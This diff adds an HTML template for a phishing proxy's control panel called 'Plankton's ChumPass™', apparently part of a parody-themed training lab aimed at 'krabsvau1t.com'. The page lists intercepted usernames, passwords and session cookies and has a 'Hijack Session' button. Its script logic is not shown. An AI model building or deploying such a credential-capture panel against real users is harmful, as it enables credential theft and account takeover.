@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Plankton's ChumPass™</title>
+  <link rel="stylesheet" href="{{ url_for('static', path='stolen.css') }}">
+</head>
+<body>
+
+<h1>Plankton's ChumPass™ — Control Panel</h1>
+<p class="status">PROXY INTERCEPTOR ACTIVE</p>
+
+<div id="no-data-placeholder">
+  <p>Waiting for target authentication on krabsvau1t.com...</p>
+</div>
+
+<ul class="stolen-grid" id="stolen-list"></ul>
+
+<template id="credential-card-tpl">
+  <li class="credential-card">
+    <div class="card-header">
+      <h2>👤 <span data-field="username"></span></h2>
+      <span data-field="captures"></span>
+      <span data-field="time"></span>
+    </div>
+
+    <div class="field">
+      <span class="field-label">Password</span>
+      <span class="field-value" data-field="password"></span>
+    </div>
+
+    <div class="field">
+      <div class="field-row">
+        <span class="field-label">Session Cookie</span>
+        <span class="badge" data-field="session-badge"></span>
+      </div>
+      <span class="field-value" data-field="session"></span>
+    </div>
+
+    <button class="hijack-btn" data-action="hijack">Hijack Session</button>
+  </li>
+</template>
+
+<script type="module" src="{{ url_for('static', path='stolen.js') }}"></script>
+
+</body>
+</html>
